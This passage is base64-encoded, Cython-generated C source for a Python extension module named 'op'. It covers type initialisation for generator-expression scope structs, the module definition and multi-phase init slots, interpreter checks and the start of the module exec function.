fcHl4X3B0eXBlXzJvcF9fX3B5eF9zY29wZV9zdHJ1Y3RfX2dlbmV4cHIpIDwgKDApKSBfX1BZWF9FUlIoMCwgMTEzLCBfX3B5eF9MMV9lcnJvcilcbiAgI2VuZGlmXG4gICNpZiAhQ1lUSE9OX0NPTVBJTElOR19JTl9MSU1JVEVEX0FQSVxuICBpZiAoKENZVEhPTl9VU0VfVFlQRV9TTE9UUyAmJiBDWVRIT05fVVNFX1BZVFlQRV9MT09LVVApICYmIGxpa2VseSghX19weXhfbXN0YXRlLT5fX3B5eF9wdHlwZV8yb3BfX19weXhfc2NvcGVfc3RydWN0X19nZW5leHByLT50cF9kaWN0b2Zmc2V0ICYmIF9fcHl4X21zdGF0ZS0+X19weXhfcHR5cGVfMm9wX19fcHl4X3Njb3BlX3N0cnVjdF9fZ2VuZXhwci0+dHBfZ2V0YXR0cm8gPT0gUHlPYmplY3RfR2VuZXJpY0dldEF0dHIpKSB7XG4gICAgX19weXhfbXN0YXRlLT5fX3B5eF9wdHlwZV8yb3BfX19weXhfc2NvcGVfc3RydWN0X19nZW5leHByLT50cF9nZXRhdHRybyA9IFB5T2JqZWN0X0dlbmVyaWNHZXRBdHRyO1xuICB9XG4gICNlbmRpZlxuICAjaWYgQ1lUSE9OX1VTRV9UWVBFX1NQRUNTXG4gIF9fcHl4X21zdGF0ZS0+X19weXhfcHR5cGVfMm9wX19fcHl4X3Njb3BlX3N0cnVjdF8xX2dlbmV4cHIgPSAoUHlUeXBlT2JqZWN0ICopIF9fUHl4X1B5VHlwZV9Gcm9tTW9kdWxlQW5kU3BlYyhfX3B5eF9tLCAmX19weXhfdHlwZV8yb3BfX19weXhfc2NvcGVfc3RydWN0XzFfZ2VuZXhwcl9zcGVjLCBOVUxMKTsgaWYgKHVubGlrZWx5KCFfX3B5eF9tc3RhdGUtPl9fcHl4X3B0eXBlXzJvcF9fX3B5eF9zY29wZV9zdHJ1Y3RfMV9nZW5leHByKSkgX19QWVhfRVJSKDAsIDExNCwgX19weXhfTDFfZXJyb3IpXG4gIGlmIChfX1B5eF9maXhfdXBfZXh0ZW5zaW9uX3R5cGVfZnJvbV9zcGVjKCZfX3B5eF90eXBlXzJvcF9fX3B5eF9zY29wZV9zdHJ1Y3RfMV9nZW5leHByX3NwZWMsIF9fcHl4X21zdGF0ZS0+X19weXhfcHR5cGVfMm9wX19fcHl4X3Njb3BlX3N0cnVjdF8xX2dlbmV4cHIpIDwgKDApKSBfX1BZWF9FUlIoMCwgMTE0LCBfX3B5eF9MMV9lcnJvcilcbiAgI2Vsc2VcbiAgX19weXhfbXN0YXRlLT5fX3B5eF9wdHlwZV8yb3BfX19weXhfc2NvcGVfc3RydWN0XzFfZ2VuZXhwciA9ICZfX3B5eF90eXBlXzJvcF9fX3B5eF9zY29wZV9zdHJ1Y3RfMV9nZW5leHByO1xuICAjZW5kaWZcbiAgI2lmICFDWVRIT05fQ09NUElMSU5HX0lOX0xJTUlURURfQVBJXG4gICNlbmRpZlxuICAjaWYgIUNZVEhPTl9VU0VfVFlQRV9TUEVDU1xuICBpZiAoX19QeXhfUHlUeXBlX1JlYWR5KF9fcHl4X21zdGF0ZS0+X19weXhfcHR5cGVfMm9wX19fcHl4X3Njb3BlX3N0cnVjdF8xX2dlbmV4cHIpIDwgKDApKSBfX1BZWF9FUlIoMCwgMTE0LCBfX3B5eF9MMV9lcnJvcilcbiAgI2VuZGlmXG4gICNpZiAhQ1lUSE9OX0NPTVBJTElOR19JTl9MSU1JVEVEX0FQSVxuICBpZiAoKENZVEhPTl9VU0VfVFlQRV9TTE9UUyAmJiBDWVRIT05fVVNFX1BZVFlQRV9MT09LVVApICYmIGxpa2VseSghX19weXhfbXN0YXRlLT5fX3B5eF9wdHlwZV8yb3BfX19weXhfc2NvcGVfc3RydWN0XzFfZ2VuZXhwci0+dHBfZGljdG9mZnNldCAmJiBfX3B5eF9tc3RhdGUtPl9fcHl4X3B0eXBlXzJvcF9fX3B5eF9zY29wZV9zdHJ1Y3RfMV9nZW5leHByLT50cF9nZXRhdHRybyA9PSBQeU9iamVjdF9HZW5lcmljR2V0QXR0cikpIHtcbiAgICBfX3B5eF9tc3RhdGUtPl9fcHl4X3B0eXBlXzJvcF9fX3B5eF9zY29wZV9zdHJ1Y3RfMV9nZW5leHByLT50cF9nZXRhdHRybyA9IFB5T2JqZWN0X0dlbmVyaWNHZXRBdHRyO1xuICB9XG4gICNlbmRpZlxuICAjaWYgQ1lUSE9OX1VTRV9UWVBFX1NQRUNTXG4gIF9fcHl4X21zdGF0ZS0+X19weXhfcHR5cGVfMm9wX19fcHl4X3Njb3BlX3N0cnVjdF8yX2dlbmV4cHIgPSAoUHlUeXBlT2JqZWN0ICopIF9fUHl4X1B5VHlwZV9Gcm9tTW9kdWxlQW5kU3BlYyhfX3B5eF9tLCAmX19weXhfdHlwZV8yb3BfX19weXhfc2NvcGVfc3RydWN0XzJfZ2VuZXhwcl9zcGVjLCBOVUxMKTsgaWYgKHVubGlrZWx5KCFfX3B5eF9tc3RhdGUtPl9fcHl4X3B0eXBlXzJvcF9fX3B5eF9zY29wZV9zdHJ1Y3RfMl9nZW5leHByKSkgX19QWVhfRVJSKDAsIDExNSwgX19weXhfTDFfZXJyb3IpXG4gIGlmIChfX1B5eF9maXhfdXBfZXh0ZW5zaW9uX3R5cGVfZnJvbV9zcGVjKCZfX3B5eF90eXBlXzJvcF9fX3B5eF9zY29wZV9zdHJ1Y3RfMl9nZW5leHByX3NwZWMsIF9fcHl4X21zdGF0ZS0+X19weXhfcHR5cGVfMm9wX19fcHl4X3Njb3BlX3N0cnVjdF8yX2dlbmV4cHIpIDwgKDApKSBfX1BZWF9FUlIoMCwgMTE1LCBfX3B5eF9MMV9lcnJvcilcbiAgI2Vsc2VcbiAgX19weXhfbXN0YXRlLT5fX3B5eF9wdHlwZV8yb3BfX19weXhfc2NvcGVfc3RydWN0XzJfZ2VuZXhwciA9ICZfX3B5eF90eXBlXzJvcF9fX3B5eF9zY29wZV9zdHJ1Y3RfMl9nZW5leHByO1xuICAjZW5kaWZcbiAgI2lmICFDWVRIT05fQ09NUElMSU5HX0lOX0xJTUlURURfQVBJXG4gICNlbmRpZlxuICAjaWYgIUNZVEhPTl9VU0VfVFlQRV9TUEVDU1xuICBpZiAoX19QeXhfUHlUeXBlX1JlYWR5KF9fcHl4X21zdGF0ZS0+X19weXhfcHR5cGVfMm9wX19fcHl4X3Njb3BlX3N0cnVjdF8yX2dlbmV4cHIpIDwgKDApKSBfX1BZWF9FUlIoMCwgMTE1LCBfX3B5eF9MMV9lcnJvcilcbiAgI2VuZGlmXG4gICNpZiAhQ1lUSE9OX0NPTVBJTElOR19JTl9MSU1JVEVEX0FQSVxuICBpZiAoKENZVEhPTl9VU0VfVFlQRV9TTE9UUyAmJiBDWVRIT05fVVNFX1BZVFlQRV9MT09LVVApICYmIGxpa2VseSghX19weXhfbXN0YXRlLT5fX3B5eF9wdHlwZV8yb3BfX19weXhfc2NvcGVfc3RydWN0XzJfZ2VuZXhwci0+dHBfZGljdG9mZnNldCAmJiBfX3B5eF9tc3RhdGUtPl9fcHl4X3B0eXBlXzJvcF9fX3B5eF9zY29wZV9zdHJ1Y3RfMl9nZW5leHByLT50cF9nZXRhdHRybyA9PSBQeU9iamVjdF9HZW5lcmljR2V0QXR0cikpIHtcbiAgICBfX3B5eF9tc3RhdGUtPl9fcHl4X3B0eXBlXzJvcF9fX3B5eF9zY29wZV9zdHJ1Y3RfMl9nZW5leHByLT50cF9nZXRhdHRybyA9IFB5T2JqZWN0X0dlbmVyaWNHZXRBdHRyO1xuICB9XG4gICNlbmRpZlxuICAjaWYgQ1lUSE9OX1VTRV9UWVBFX1NQRUNTXG4gIF9fcHl4X21zdGF0ZS0+X19weXhfcHR5cGVfMm9wX19fcHl4X3Njb3BlX3N0cnVjdF8zX2dlbmV4cHIgPSAoUHlUeXBlT2JqZWN0ICopIF9fUHl4X1B5VHlwZV9Gcm9tTW9kdWxlQW5kU3BlYyhfX3B5eF9tLCAmX19weXhfdHlwZV8yb3BfX19weXhfc2NvcGVfc3RydWN0XzNfZ2VuZXhwcl9zcGVjLCBOVUxMKTsgaWYgKHVubGlrZWx5KCFfX3B5eF9tc3RhdGUtPl9fcHl4X3B0eXBlXzJvcF9fX3B5eF9zY29wZV9zdHJ1Y3RfM19nZW5leHByKSkgX19QWVhfRVJSKDAsIDQwNiwgX19weXhfTDFfZXJyb3IpXG4gIGlmIChfX1B5eF9maXhfdXBfZXh0ZW5zaW9uX3R5cGVfZnJvbV9zcGVjKCZfX3B5eF90eXBlXzJvcF9fX3B5eF9zY29wZV9zdHJ1Y3RfM19nZW5leHByX3NwZWMsIF9fcHl4X21zdGF0ZS0+X19weXhfcHR5cGVfMm9wX19fcHl4X3Njb3BlX3N0cnVjdF8zX2dlbmV4cHIpIDwgKDApKSBfX1BZWF9FUlIoMCwgNDA2LCBfX3B5eF9MMV9lcnJvcilcbiAgI2Vsc2VcbiAgX19weXhfbXN0YXRlLT5fX3B5eF9wdHlwZV8yb3BfX19weXhfc2NvcGVfc3RydWN0XzNfZ2VuZXhwciA9ICZfX3B5eF90eXBlXzJvcF9fX3B5eF9zY29wZV9zdHJ1Y3RfM19nZW5leHByO1xuICAjZW5kaWZcbiAgI2lmICFDWVRIT05fQ09NUElMSU5HX0lOX0xJTUlURURfQVBJXG4gICNlbmRpZlxuICAjaWYgIUNZVEhPTl9VU0VfVFlQRV9TUEVDU1xuICBpZiAoX19QeXhfUHlUeXBlX1JlYWR5KF9fcHl4X21zdGF0ZS0+X19weXhfcHR5cGVfMm9wX19fcHl4X3Njb3BlX3N0cnVjdF8zX2dlbmV4cHIpIDwgKDApKSBfX1BZWF9FUlIoMCwgNDA2LCBfX3B5eF9MMV9lcnJvcilcbiAgI2VuZGlmXG4gICNpZiAhQ1lUSE9OX0NPTVBJTElOR19JTl9MSU1JVEVEX0FQSVxuICBpZiAoKENZVEhPTl9VU0VfVFlQRV9TTE9UUyAmJiBDWVRIT05fVVNFX1BZVFlQRV9MT09LVVApICYmIGxpa2VseSghX19weXhfbXN0YXRlLT5fX3B5eF9wdHlwZV8yb3BfX19weXhfc2NvcGVfc3RydWN0XzNfZ2VuZXhwci0+dHBfZGljdG9mZnNldCAmJiBfX3B5eF9tc3RhdGUtPl9fcHl4X3B0eXBlXzJvcF9fX3B5eF9zY29wZV9zdHJ1Y3RfM19nZW5leHByLT50cF9nZXRhdHRybyA9PSBQeU9iamVjdF9HZW5lcmljR2V0QXR0cikpIHtcbiAgICBfX3B5eF9tc3RhdGUtPl9fcHl4X3B0eXBlXzJvcF9fX3B5eF9zY29wZV9zdHJ1Y3RfM19nZW5leHByLT50cF9nZXRhdHRybyA9IFB5T2JqZWN0X0dlbmVyaWNHZXRBdHRyO1xuICB9XG4gICNlbmRpZlxuICBfX1B5eF9SZWZOYW5ueUZpbmlzaENvbnRleHQoKTtcbiAgcmV0dXJuIDA7XG4gIF9fcHl4X0wxX2Vycm9yOjtcbiAgX19QeXhfUmVmTmFubnlGaW5pc2hDb250ZXh0KCk7XG4gIHJldHVybiAtMTtcbn1cblxuc3RhdGljIGludCBfX1B5eF9tb2Rpbml0X3R5cGVfaW1wb3J0X2NvZGUoX19weXhfbXN0YXRldHlwZSAqX19weXhfbXN0YXRlKSB7XG4gIF9fUHl4X1JlZk5hbm55RGVjbGFyYXRpb25zXG4gIENZVEhPTl9VTlVTRURfVkFSKF9fcHl4X21zdGF0ZSk7XG4gIF9fUHl4X1JlZk5hbm55U2V0dXBDb250ZXh0KCJfX1B5eF9tb2Rpbml0X3R5cGVfaW1wb3J0X2NvZGUiLCAwKTtcbiAgXG4gIF9fUHl4X1JlZk5hbm55RmluaXNoQ29udGV4dCgpO1xuICByZXR1cm4gMDtcbn1cblxuc3RhdGljIGludCBfX1B5eF9tb2Rpbml0X3ZhcmlhYmxlX2ltcG9ydF9jb2RlKF9fcHl4X21zdGF0ZXR5cGUgKl9fcHl4X21zdGF0ZSkge1xuICBfX1B5eF9SZWZOYW5ueURlY2xhcmF0aW9uc1xuICBDWVRIT05fVU5VU0VEX1ZBUihfX3B5eF9tc3RhdGUpO1xuICBfX1B5eF9SZWZOYW5ueVNldHVwQ29udGV4dCgiX19QeXhfbW9kaW5pdF92YXJpYWJsZV9pbXBvcnRfY29kZSIsIDApO1xuICBcbiAgX19QeXhfUmVmTmFubnlGaW5pc2hDb250ZXh0KCk7XG4gIHJldHVybiAwO1xufVxuXG5zdGF0aWMgaW50IF9fUHl4X21vZGluaXRfZnVuY3Rpb25faW1wb3J0X2NvZGUoX19weXhfbXN0YXRldHlwZSAqX19weXhfbXN0YXRlKSB7XG4gIF9fUHl4X1JlZk5hbm55RGVjbGFyYXRpb25zXG4gIENZVEhPTl9VTlVTRURfVkFSKF9fcHl4X21zdGF0ZSk7XG4gIF9fUHl4X1JlZk5hbm55U2V0dXBDb250ZXh0KCJfX1B5eF9tb2Rpbml0X2Z1bmN0aW9uX2ltcG9ydF9jb2RlIiwgMCk7XG4gIFxuICBfX1B5eF9SZWZOYW5ueUZpbmlzaENvbnRleHQoKTtcbiAgcmV0dXJuIDA7XG59XG5cbiNpZiBDWVRIT05fUEVQNDg5X01VTFRJX1BIQVNFX0lOSVRcbnN0YXRpYyBQeU9iamVjdCogX19weXhfcHltb2RfY3JlYXRlKFB5T2JqZWN0ICpzcGVjLCBQeU1vZHVsZURlZiAqZGVmKTsgXG5zdGF0aWMgaW50IF9fcHl4X3B5bW9kX2V4ZWNfb3AoUHlPYmplY3QqIG1vZHVsZSk7IFxuc3RhdGljIFB5TW9kdWxlRGVmX1Nsb3QgX19weXhfbW9kdWxlZGVmX3Nsb3RzW10gPSB7XG4gIHtQeV9tb2RfY3JlYXRlLCAodm9pZCopX19weXhfcHltb2RfY3JlYXRlfSxcbiAge1B5X21vZF9leGVjLCAodm9pZCopX19weXhfcHltb2RfZXhlY19vcH0sXG4gICNpZiBDWVRIT05fQ09NUElMSU5HX0lOX0NQWVRIT05fRlJFRVRIUkVBRElOR1xuICB7UHlfbW9kX2dpbCwgUHlfTU9EX0dJTF9VU0VEfSxcbiAgI2VuZGlmXG4gICNpZiBQWV9WRVJTSU9OX0hFWCA+PSAweDAzMEMwMDAwICYmIENZVEhPTl9VU0VfTU9EVUxFX1NUQVRFXG4gIHtQeV9tb2RfbXVsdGlwbGVfaW50ZXJwcmV0ZXJzLCBQeV9NT0RfTVVMVElQTEVfSU5URVJQUkVURVJTX05PVF9TVVBQT1JURUR9LFxuICAjZW5kaWZcbiAgezAsIE5VTEx9XG59O1xuI2VuZGlmXG5cbiNpZmRlZiBfX2NwbHVzcGx1c1xubmFtZXNwYWNlIHtcbiAgc3RydWN0IFB5TW9kdWxlRGVmIF9fcHl4X21vZHVsZWRlZiA9XG4gICNlbHNlXG4gIHN0YXRpYyBzdHJ1Y3QgUHlNb2R1bGVEZWYgX19weXhfbW9kdWxlZGVmID1cbiAgI2VuZGlmXG4gIHtcbiAgICAgIFB5TW9kdWxlRGVmX0hFQURfSU5JVCxcbiAgICAgICJvcCIsXG4gICAgICAwLCBcbiAgICAjaWYgQ1lUSE9OX1VTRV9NT0RVTEVfU1RBVEVcbiAgICAgIHNpemVvZihfX3B5eF9tc3RhdGV0eXBlKSwgXG4gICAgI2Vsc2VcbiAgICAgIChDWVRIT05fUEVQNDg5X01VTFRJX1BIQVNFX0lOSVQpID8gMCA6IC0xLCBcbiAgICAjZW5kaWZcbiAgICAgIF9fcHl4X21ldGhvZHMgLFxuICAgICNpZiBDWVRIT05fUEVQNDg5X01VTFRJX1BIQVNFX0lOSVRcbiAgICAgIF9fcHl4X21vZHVsZWRlZl9zbG90cywgXG4gICAgI2Vsc2VcbiAgICAgIE5VTEwsIFxuICAgICNlbmRpZlxuICAgICNpZiBDWVRIT05fVVNFX01PRFVMRV9TVEFURVxuICAgICAgX19weXhfbV90cmF2ZXJzZSwgXG4gICAgICBfX3B5eF9tX2NsZWFyLCBcbiAgICAgIE5VTEwgXG4gICAgI2Vsc2VcbiAgICAgIE5VTEwsIFxuICAgICAgTlVMTCwgXG4gICAgICBOVUxMIFxuICAgICNlbmRpZlxuICB9O1xuICAjaWZkZWYgX19jcGx1c3BsdXNcbn0gXG4jZW5kaWZcblxuXG4jaWZuZGVmIENZVEhPTl9OT19QWUlOSVRfRVhQT1JUXG4gICNkZWZpbmUgX19QeXhfUHlNT0RJTklUX0ZVTkMgUHlNT0RJTklUX0ZVTkNcbiNlbHNlXG4gICNpZmRlZiBfX2NwbHVzcGx1c1xuICAjZGVmaW5lIF9fUHl4X1B5TU9ESU5JVF9GVU5DIGV4dGVybiAiQyIgUHlPYmplY3QgKlxuICAjZWxzZVxuICAjZGVmaW5lIF9fUHl4X1B5TU9ESU5JVF9GVU5DIFB5T2JqZWN0ICpcbiAgI2VuZGlmXG4jZW5kaWZcblxuX19QeXhfUHlNT0RJTklUX0ZVTkMgUHlJbml0X29wKHZvaWQpIENZVEhPTl9TTUFMTF9DT0RFOyBcbl9fUHl4X1B5TU9ESU5JVF9GVU5DIFB5SW5pdF9vcCh2b2lkKVxuI2lmIENZVEhPTl9QRVA0ODlfTVVMVElfUEhBU0VfSU5JVFxue1xuICByZXR1cm4gUHlNb2R1bGVEZWZfSW5pdCgmX19weXhfbW9kdWxlZGVmKTtcbn1cblxuI2lmIENZVEhPTl9DT01QSUxJTkdfSU5fTElNSVRFRF9BUEkgJiYgX19QWVhfTElNSVRFRF9WRVJTSU9OX0hFWCA8IDB4MDMwOTAwMDBcbnN0YXRpYyBQWV9JTlQ2NF9UIF9fUHl4X0dldEN1cnJlbnRJbnRlcnByZXRlcklkKHZvaWQpIHtcbiAgICB7XG4gICAgICAgIFB5T2JqZWN0ICptb2R1bGUgPSBQeUltcG9ydF9JbXBvcnRNb2R1bGUoIl9pbnRlcnByZXRlcnMiKTsgLy8gMy4xMysgSSB0aGlua1xuICAgICAgICBpZiAoIW1vZHVsZSkge1xuICAgICAgICAgICAgUHlFcnJfQ2xlYXIoKTsgLy8ganVzdCB0cnkgdGhlIDMuOC0zLjEyIHZlcnNpb25cbiAgICAgICAgICAgIG1vZHVsZSA9IFB5SW1wb3J0X0ltcG9ydE1vZHVsZSgiX3h4c3ViaW50ZXJwcmV0ZXJzIik7XG4gICAgICAgICAgICBpZiAoIW1vZHVsZSkgZ290byBiYWQ7XG4gICAgICAgIH1cbiAgICAgICAgUHlPYmplY3QgKmN1cnJlbnQgPSBQeU9iamVjdF9DYWxsTWV0aG9kKG1vZHVsZSwgImdldF9jdXJyZW50IiwgTlVMTCk7XG4gICAgICAgIFB5X0RFQ1JFRihtb2R1bGUpO1xuICAgICAgICBpZiAoIWN1cnJlbnQpIGdvdG8gYmFkO1xuICAgICAgICBpZiAoUHlUdXBsZV9DaGVjayhjdXJyZW50KSkge1xuICAgICAgICAgICAgUHlPYmplY3QgKm5ld19jdXJyZW50ID0gUHlTZXF1ZW5jZV9HZXRJdGVtKGN1cnJlbnQsIDApO1xuICAgICAgICAgICAgUHlfREVDUkVGKGN1cnJlbnQpO1xuICAgICAgICAgICAgY3VycmVudCA9IG5ld19jdXJyZW50O1xuICAgICAgICAgICAgaWYgKCFuZXdfY3VycmVudCkgZ290byBiYWQ7XG4gICAgICAgIH1cbiAgICAgICAgbG9uZyBsb25nIGFzX2NfaW50ID0gUHlMb25nX0FzTG9uZ0xvbmcoY3VycmVudCk7XG4gICAgICAgIFB5X0RFQ1JFRihjdXJyZW50KTtcbiAgICAgICAgcmV0dXJuIGFzX2NfaW50O1xuICAgIH1cbiAgYmFkOlxuICAgIFB5U3lzX1dyaXRlU3RkZXJyKCJfX1B5eF9HZXRDdXJyZW50SW50ZXJwcmV0ZXJJZCBmYWlsZWQuIFRyeSBzZXR0aW5nIHRoZSBDIGRlZmluZSBDWVRIT05fUEVQNDg5X01VTFRJX1BIQVNFX0lOSVQ9MFxcbiIpO1xuICAgIHJldHVybiAtMTtcbn1cbiNlbmRpZlxuI2lmICFDWVRIT05fVVNFX01PRFVMRV9TVEFURVxuc3RhdGljIENZVEhPTl9TTUFMTF9DT0RFIGludCBfX1B5eF9jaGVja19zaW5nbGVfaW50ZXJwcmV0ZXIodm9pZCkge1xuICAgIHN0YXRpYyBQWV9JTlQ2NF9UIG1haW5faW50ZXJwcmV0ZXJfaWQgPSAtMTtcbiNpZiBDWVRIT05fQ09NUElMSU5HX0lOX0dSQUFMXG4gICAgUFlfSU5UNjRfVCBjdXJyZW50X2lkID0gUHlJbnRlcnByZXRlclN0YXRlX0dldElERnJvbVRocmVhZFN0YXRlKFB5VGhyZWFkU3RhdGVfR2V0KCkpO1xuI2VsaWYgQ1lUSE9OX0NPTVBJTElOR19JTl9MSU1JVEVEX0FQSSAmJiBfX1BZWF9MSU1JVEVEX1ZFUlNJT05fSEVYID49IDB4MDMwOTAwMDBcbiAgICBQWV9JTlQ2NF9UIGN1cnJlbnRfaWQgPSBQeUludGVycHJldGVyU3RhdGVfR2V0SUQoUHlJbnRlcnByZXRlclN0YXRlX0dldCgpKTtcbiNlbGlmIENZVEhPTl9DT01QSUxJTkdfSU5fTElNSVRFRF9BUElcbiAgICBQWV9JTlQ2NF9UIGN1cnJlbnRfaWQgPSBfX1B5eF9HZXRDdXJyZW50SW50ZXJwcmV0ZXJJZCgpO1xuI2Vsc2VcbiAgICBQWV9JTlQ2NF9UIGN1cnJlbnRfaWQgPSBQeUludGVycHJldGVyU3RhdGVfR2V0SUQoUHlUaHJlYWRTdGF0ZV9HZXQoKS0+aW50ZXJwKTtcbiNlbmRpZlxuICAgIGlmICh1bmxpa2VseShjdXJyZW50X2lkID09IC0xKSkge1xuICAgICAgICByZXR1cm4gLTE7XG4gICAgfVxuICAgIGlmIChtYWluX2ludGVycHJldGVyX2lkID09IC0xKSB7XG4gICAgICAgIG1haW5faW50ZXJwcmV0ZXJfaWQgPSBjdXJyZW50X2lkO1xuICAgICAgICByZXR1cm4gMDtcbiAgICB9IGVsc2UgaWYgKHVubGlrZWx5KG1haW5faW50ZXJwcmV0ZXJfaWQgIT0gY3VycmVudF9pZCkpIHtcbiAgICAgICAgUHlFcnJfU2V0U3RyaW5nKFxuICAgICAgICAgICAgUHlFeGNfSW1wb3J0RXJyb3IsXG4gICAgICAgICAgICAiSW50ZXJwcmV0ZXIgY2hhbmdlIGRldGVjdGVkIC0gdGhpcyBtb2R1bGUgY2FuIG9ubHkgYmUgbG9hZGVkIGludG8gb25lIGludGVycHJldGVyIHBlciBwcm9jZXNzLiIpO1xuICAgICAgICByZXR1cm4gLTE7XG4gICAgfVxuICAgIHJldHVybiAwO1xufVxuI2VuZGlmXG5zdGF0aWMgQ1lUSE9OX1NNQUxMX0NPREUgaW50IF9fUHl4X2NvcHlfc3BlY190b19tb2R1bGUoUHlPYmplY3QgKnNwZWMsIFB5T2JqZWN0ICptb2RkaWN0LCBjb25zdCBjaGFyKiBmcm9tX25hbWUsIGNvbnN0IGNoYXIqIHRvX25hbWUsIGludCBhbGxvd19ub25lKVxue1xuICAgIFB5T2JqZWN0ICp2YWx1ZSA9IFB5T2JqZWN0X0dldEF0dHJTdHJpbmcoc3BlYywgZnJvbV9uYW1lKTtcbiAgICBpbnQgcmVzdWx0ID0gMDtcbiAgICBpZiAobGlrZWx5KHZhbHVlKSkge1xuICAgICAgICBpZiAoYWxsb3dfbm9uZSB8fCB2YWx1ZSAhPSBQeV9Ob25lKSB7XG4gICAgICAgICAgICByZXN1bHQgPSBQeURpY3RfU2V0SXRlbVN0cmluZyhtb2RkaWN0LCB0b19uYW1lLCB2YWx1ZSk7XG4gICAgICAgIH1cbiAgICAgICAgUHlfREVDUkVGKHZhbHVlKTtcbiAgICB9IGVsc2UgaWYgKFB5RXJyX0V4Y2VwdGlvbk1hdGNoZXMoUHlFeGNfQXR0cmlidXRlRXJyb3IpKSB7XG4gICAgICAgIFB5RXJyX0NsZWFyKCk7XG4gICAgfSBlbHNlIHtcbiAgICAgICAgcmVzdWx0ID0gLTE7XG4gICAgfVxuICAgIHJldHVybiByZXN1bHQ7XG59XG5zdGF0aWMgQ1lUSE9OX1NNQUxMX0NPREUgUHlPYmplY3QqIF9fcHl4X3B5bW9kX2NyZWF0ZShQeU9iamVjdCAqc3BlYywgUHlNb2R1bGVEZWYgKmRlZikge1xuICAgIFB5T2JqZWN0ICptb2R1bGUgPSBOVUxMLCAqbW9kZGljdCwgKm1vZG5hbWU7XG4gICAgQ1lUSE9OX1VOVVNFRF9WQVIoZGVmKTtcbiAgICAjaWYgIUNZVEhPTl9VU0VfTU9EVUxFX1NUQVRFXG4gICAgaWYgKF9fUHl4X2NoZWNrX3NpbmdsZV9pbnRlcnByZXRlcigpKVxuICAgICAgICByZXR1cm4gTlVMTDtcbiAgICAjZW5kaWZcbiAgICBpZiAoX19weXhfbSlcbiAgICAgICAgcmV0dXJuIF9fUHl4X05ld1JlZihfX3B5eF9tKTtcbiAgICBtb2RuYW1lID0gUHlPYmplY3RfR2V0QXR0clN0cmluZyhzcGVjLCAibmFtZSIpO1xuICAgIGlmICh1bmxpa2VseSghbW9kbmFtZSkpIGdvdG8gYmFkO1xuICAgIG1vZHVsZSA9IFB5TW9kdWxlX05ld09iamVjdChtb2RuYW1lKTtcbiAgICBQeV9ERUNSRUYobW9kbmFtZSk7XG4gICAgaWYgKHVubGlrZWx5KCFtb2R1bGUpKSBnb3RvIGJhZDtcbiAgICBtb2RkaWN0ID0gUHlNb2R1bGVfR2V0RGljdChtb2R1bGUpO1xuICAgIGlmICh1bmxpa2VseSghbW9kZGljdCkpIGdvdG8gYmFkO1xuICAgIGlmICh1bmxpa2VseShfX1B5eF9jb3B5X3NwZWNfdG9fbW9kdWxlKHNwZWMsIG1vZGRpY3QsICJsb2FkZXIiLCAiX19sb2FkZXJfXyIsIDEpIDwgMCkpIGdvdG8gYmFkO1xuICAgIGlmICh1bmxpa2VseShfX1B5eF9jb3B5X3NwZWNfdG9fbW9kdWxlKHNwZWMsIG1vZGRpY3QsICJvcmlnaW4iLCAiX19maWxlX18iLCAxKSA8IDApKSBnb3RvIGJhZDtcbiAgICBpZiAodW5saWtlbHkoX19QeXhfY29weV9zcGVjX3RvX21vZHVsZShzcGVjLCBtb2RkaWN0LCAicGFyZW50IiwgIl9fcGFja2FnZV9fIiwgMSkgPCAwKSkgZ290byBiYWQ7XG4gICAgaWYgKHVubGlrZWx5KF9fUHl4X2NvcHlfc3BlY190b19tb2R1bGUoc3BlYywgbW9kZGljdCwgInN1Ym1vZHVsZV9zZWFyY2hfbG9jYXRpb25zIiwgIl9fcGF0aF9fIiwgMCkgPCAwKSkgZ290byBiYWQ7XG4gICAgcmV0dXJuIG1vZHVsZTtcbmJhZDpcbiAgICBQeV9YREVDUkVGKG1vZHVsZSk7XG4gICAgcmV0dXJuIE5VTEw7XG59XG5cblxuc3RhdGljIENZVEhPTl9TTUFMTF9DT0RFIGludCBfX3B5eF9weW1vZF9leGVjX29wKFB5T2JqZWN0ICpfX3B5eF9weWluaXRfbW9kdWxlKVxuI2VuZGlmXG57XG4gIGludCBzdHJpbmd0YWJfaW5pdGlhbGl6ZWQgPSAwO1xuICAjaWYgQ1lUSE9OX1VTRV9NT0RVTEVfU1RBVEVcbiAgaW50IHB5c3RhdGVfYWRkbW9kdWxlX3J1biA9IDA7XG4gICNlbmRpZlxuICBfX3B5eF9tc3RhdGV0eXBlICpfX3B5eF9tc3RhdGUgPSBOVUxMO1xuICBQeU9iamVjdCAqX19weXhfdF8xID0gTlVMTDtcbiAgUHlPYmplY3QgKl9fcHl4X3RfMiA9IE5VTEw7XG4gIFB5T2JqZWN0ICpfX3B5eF90XzMgPSBOVUxMO1xuICBQeU9iamVjdCAqX19weXhfdF80ID0gTlVMTDtcbiAgUHlPYmplY3QgKl9fcHl4X3RfNSA9IE5VTEw7XG4gIHNpemVfdCBfX3B5eF90XzY7XG4gIFB5T2JqZWN0ICpfX3B5eF90XzcgPSBOVUxMO1xuICBQeU9iamVjdCAqX19weXhfdF84ID0gTlVMTDtcbiAgUHlPYmplY3QgKl9fcHl4X3RfOSA9IE5VTEw7XG4gIFB5T2JqZWN0ICpfX3B5eF90XzEwID0gTlVMTDtcbiAgUHlPYmplY3QgKl9fcHl4X3RfMTEgPSBOVUxMO1xuICBQeU9iamVjdCAqX19weXhfdF8xMlszXTtcbiAgaW50IF9fcHl4X2xpbmVubyA9IDA7XG4gIGNvbnN0IGNoYXIgKl9fcHl4X2ZpbGVuYW1lID0gTlVMTDtcbiAgaW50IF9fcHl4X2NsaW5lbm8gPSAwO1xuICBfX1B5eF9SZWZOYW5ueURlY2xhcmF0aW9uc1xuICAjaWYgQ1lUSE9OX1BFUDQ4OV9NVUxUSV9QSEFTRV9JTklUXG4gIGlmIChfX3B5eF9tKSB7XG4gICAgaWYgKF9fcHl4X20gPT0gX19weXhfcHlpbml0X21vZHVsZSkgcmV0dXJuIDA7XG4gICAgUHlFcnJfU2V0U3RyaW5nKFB5RXhjX1J1bnRpbWVFcnJvciwgIk1vZHVsZSBcJ29wXCcgaGFzIGFscmVhZHkgYmVlbiBpbXBvcnRlZC4gUmUtaW5pdGlhbGlzYXRpb24gaXMgbm90IHN1cHBvcnRlZC4iKTtcbiAgICByZXR1cm4gLTE7XG4gIH1cbiAgI2Vsc2VcbiAgaWYgKF9fcHl4X20pIHJldHVybiBfX1B5eF9OZXdSZWYoX19weXhfbSk7XG4gICNlbmRpZlxuICBcbiAgI2lmIENZVEhPTl9QRVA0ODlfTVVMVElfUEhBU0VfSU5JVFxuICBfX3B5eF90XzEgPSBfX3B5eF9weWluaXRfbW9kdWxlO1xuICBQeV9JT